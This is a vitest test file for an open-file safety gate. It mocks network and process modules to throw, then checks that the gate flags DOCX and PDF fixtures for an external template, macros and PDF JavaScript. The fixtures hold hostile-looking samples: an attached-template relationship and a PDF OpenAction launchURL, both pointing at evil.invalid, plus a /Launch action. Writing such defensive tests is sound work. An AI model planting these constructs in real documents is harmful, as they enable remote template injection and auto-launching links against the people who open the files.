// The safety gate only reads. Any attempt to start a program or touch the network would throw here.
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterAll, beforeAll, expect, it, vi } from "vitest";

const forbid = (name: string) => new Proxy({}, { get: (_t, prop) => { throw new Error(`${name}.${String(prop)} must not be used by the open-file gate`); } });
vi.mock("node:child_process", () => forbid("child_process"));
vi.mock("node:http", () => forbid("http"));
vi.mock("node:https", () => forbid("https"));
vi.mock("node:net", () => forbid("net"));
vi.mock("node:dns", () => forbid("dns"));

import { assessOpenCandidate } from "@/lib/desktop/open-safety";
import { docxParts, pdf, rels, zipOf } from "./helpers/open-fixtures";

let dir: string;
beforeAll(() => { dir = fs.mkdtempSync(path.join(os.tmpdir(), "lm-open-ns-")); vi.stubGlobal("fetch", () => { throw new Error("fetch must not be used"); }); });
afterAll(() => { vi.unstubAllGlobals(); fs.rmSync(dir, { recursive: true, force: true }); });

it("assesses hostile-looking documents (macro name, external template, JavaScript, Launch) without spawning or fetching", async () => {
  const R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
  const files: [string, Buffer][] = [
    ["a.docx", await zipOf(docxParts({ documentRels: rels(`<Relationship Id="r1" Type="${R}/attachedTemplate" Target="http://evil.invalid/t.dotm" TargetMode="External"/>`) }))],
    ["b.docx", await zipOf(docxParts({ extra: [{ name: "word/vbaProject.bin", data: "sintético" }] }))],
    ["c.pdf", pdf("/OpenAction << /S /JavaScript /JS (app.launchURL('http://evil.invalid')) >> /Launch")],
  ];
  const out = [];
  for (const [name, data] of files) { const f = path.join(dir, name); fs.writeFileSync(f, data); out.push(await assessOpenCandidate(f)); }
  expect(out.map(a => a.ok)).toEqual([true, false, true]);
  expect(out[0].findings.map(f => f.code)).toContain("external-content");
  expect(out[1].findings.map(f => f.code)).toContain("macros");
  expect(out[2].findings.map(f => f.code)).toContain("pdf-javascript");
});
